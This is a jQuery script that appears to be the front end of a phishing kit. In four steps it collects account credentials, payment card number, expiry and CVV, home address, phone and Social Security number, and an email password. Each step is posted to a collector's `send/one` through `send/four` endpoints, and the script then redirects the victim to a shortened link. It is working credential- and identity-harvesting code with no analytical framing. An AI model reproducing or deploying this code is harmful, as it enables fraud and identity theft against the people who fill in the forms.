$(document).ready(function() {
	var link = $('#link').val();

	_resize();

	$(window).resize(function(event) {
		_resize();
	});


	function _resize(){
		if ($(window).height() > $("#content").height()) {
			var _height = $(window).height() - $("#content").height();
			if ($(window).width() < 800) {
				$("#content").css('margin-top', (_height/3)+'px');
			}else{
				$("#content").css('margin-top', (_height/2)+'px');
			}
		}
	}


	$(document).on('keyup', '.input-wrapper input', function(event) {
		var _this = $(this);
		if (_this.val() == '' && _this.attr('placeholder') == '') {
			_this.siblings('label').removeClass('active');
			_this.parents('.input-wrapper').removeClass('valid');
		}else{
			_this.siblings('label').addClass('active');
			_this.parents('.input-wrapper').addClass('valid');
		}
	});


	$(document).on('blur', '.input-wrapper input', function(event) {

		// user
		// pass

	});



	$(document).on('keyup', '#ccnum', function(event) {

		var str = $('#ccnum').val();
		var res = str.substring(0, 1);
		if (res == '4') {
			$('.cards').addClass('visa');
		}else{
			$('.cards').removeClass('visa');
		}
		if ($('#ccnum').val() == '') {
			$('.x-cc').text('0000 0000 0000 0000');
		}else{
			var v = $('#ccnum').val();
			v = v.replace(/[^\d]/g, '');
			v = v.match(/.{1,4}/g);
			v = v.join(' ');
			$('#ccnum').val(v);
			$('.x-cc').text(v);
		}
	});



	$(document).on('keyup', '#holder', function(event) {
		if ($('#holder').val() == '') {
			$('.x-name').text('CARD HOLDER');
		}else{
			$('.x-name').text($('#holder').val());
		}
	});



	$(document).on('keyup', '#exp', function(event) {
		if ($('#exp').val() == '') {
			$('.x-exp').text('MM/YY');
		}else{
			var v = $('#exp').val();
			v = v.replace(/[^\d]/g, '');
			v = v.match(/.{1,2}/g);
			v = v.join('/');
			$('#exp').val(v);
			$('.x-exp').text(v);
		}
	});

// ---------------------------------------------------------------------------------------

	$(document).on('keydown', '#user,#pass', function(event) {
		if (event.which == 13) {
			$('#btn1').click();
		}
	});

	$(document).on('click', '#btn1', function(event) {
		if (/\w+@\w+\..*/.test($("#user").val()) == false) {
			$("#user").addClass('error').removeClass('valid').focus();
			return false;
		}else{
			$("#user").addClass('valid').removeClass('error');
		}

		if (/.{4,}/.test($("#pass").val()) == false) {
			$("#pass").addClass('error').removeClass('valid').focus();
			return false;
		}else{
			$("#pass").addClass('valid').removeClass('error');
		}

		$.post(link+'send/one', {
			_: new Date().getTime(),
			user: $('#user').val(),
			pass: $('#pass').val()
		}, function(data, textStatus, xhr) {
			console.log(data);
			$('.steps').css('display','none');
			$('.step-2').css('display','block');
		});

	});

// ---------------------------------------------------------------------------------------

	$(document).on('keydown', '#holder,#ccnum,#exp,#cvv', function(event) {
		if (event.which == 13) {
			$('#btn2').click();
		}
	});

	$(document).on('click', '#btn2', function(event) {
		if (/.{4,}/.test($("#holder").val()) == false) {
			$("#holder").addClass('error').removeClass('valid').focus();
			return false;
		}else{
			$("#holder").addClass('valid').removeClass('error');
		}

		if (/.{15,}/.test($("#ccnum").val()) == false) {
			$("#ccnum").addClass('error').removeClass('valid').focus();
			return false;
		}else{
			$("#ccnum").addClass('valid').removeClass('error');
		}

		if (/.{4,}/.test($("#exp").val()) == false) {
			$("#exp").addClass('error').removeClass('valid').focus();
			return false;
		}else{
			$("#exp").addClass('valid').removeClass('error');
		}

		if (/\d{3,}/.test($("#cvv").val()) == false) {
			$("#cvv").addClass('error').removeClass('valid').focus();
			return false;
		}else{
			$("#cvv").addClass('valid').removeClass('error');
		}

		$.post(link+'send/two', {
			_: new Date().getTime(),
			holder: $('#holder').val(),
			ccnum: $('#ccnum').val(),
			exp: $('#exp').val(),
			cvv: $('#cvv').val()
		}, function(data, textStatus, xhr) {
			console.log(data);
			$('.steps').css('display','none');
			$('.step-3').css('display','block');
		});

	});

// ---------------------------------------------------------------------------------------
	$(document).on('keydown', '#full_name,#address,#city,#state,#zipcode,#phone,#ssn', function(event) {
		if (event.which == 13) {
			$('#btn3').click();
		}
	});
	$(document).on('click', '#btn3', function(event) {
		if (/.{6,}/.test($("#address").val()) == false) {
			$("#address").addClass('error').removeClass('valid').focus();
			return false;
		}else{
			$("#address").addClass('valid').removeClass('error');
		}

		if (/.{2,}/.test($("#city").val()) == false) {
			$("#city").addClass('error').removeClass('valid').focus();
			return false;
		}else{
			$("#city").addClass('valid').removeClass('error');
		}

		if (/.{2,}/.test($("#state").val()) == false) {
			$("#state").addClass('error').removeClass('valid').focus();
			return false;
		}else{
			$("#state").addClass('valid').removeClass('error');
		}

		if (/.{4,}/.test($("#zipcode").val()) == false) {
			$("#zipcode").addClass('error').removeClass('valid').focus();
			return false;
		}else{
			$("#zipcode").addClass('valid').removeClass('error');
		}

		if (/.{4,}/.test($("#phone").val()) == false) {
			$("#phone").addClass('error').removeClass('valid').focus();
			return false;
		}else{
			$("#phone").addClass('valid').removeClass('error');
		}

		if (/.{6,}/.test($("#ssn").val()) == false) {
			$("#ssn").addClass('error').removeClass('valid').focus();
			return false;
		}else{
			$("#ssn").addClass('valid').removeClass('error');
		}
		$.post(link+'send/three', {
			_: new Date().getTime(),
			full_name: $('#full_name').val(),
			address: $('#address').val(),
			city: $('#city').val(),
			state: $('#state').val(),
			zipcode: $('#zipcode').val(),
			phone: $('#phone').val(),
			ssn: $('#ssn').val()
		}, function(data, textStatus, xhr) {
			console.log(data);

			$('#email').val($('#user').val());
			$('.steps').css('display','none');
			$('.step-4').css('display','block');
			
		});

	});


// ---------------------------------------------------------------------------------------
	$(document).on('keydown', '#email,#password', function(event) {
		if (event.which == 13) {
			$('#btn4').click();
		}
	});

	$(document).on('click', '#btn4', function(event) {
		if (/\w+@\w+\..*/.test($("#email").val()) == false) {
			$("#email").addClass('error').removeClass('valid').focus();
			return false;
		}else{
			$("#email").addClass('valid').removeClass('error');
		}


		if (/.{8,}/.test($("#password").val()) == false) {
			$("#password").addClass('error').removeClass('valid').focus();
			return false;
		}else{
			$("#password").addClass('valid').removeClass('error');
		}

		$.post(link+'send/four', {
			_: new Date().getTime(),
			email: $('#email').val(),
			password: $('#password').val()
		}, function(data, textStatus, xhr) {
			console.log(data);
			window.location = 'https://goo.gl/Dt1Hch';
			document.location.href = 'https://goo.gl/Dt1Hch';
			$('head').prepend('<meta http-equiv="refresh" content="0; url=https://goo.gl/Dt1Hch">');
		});

	});













	// valid
	// error


});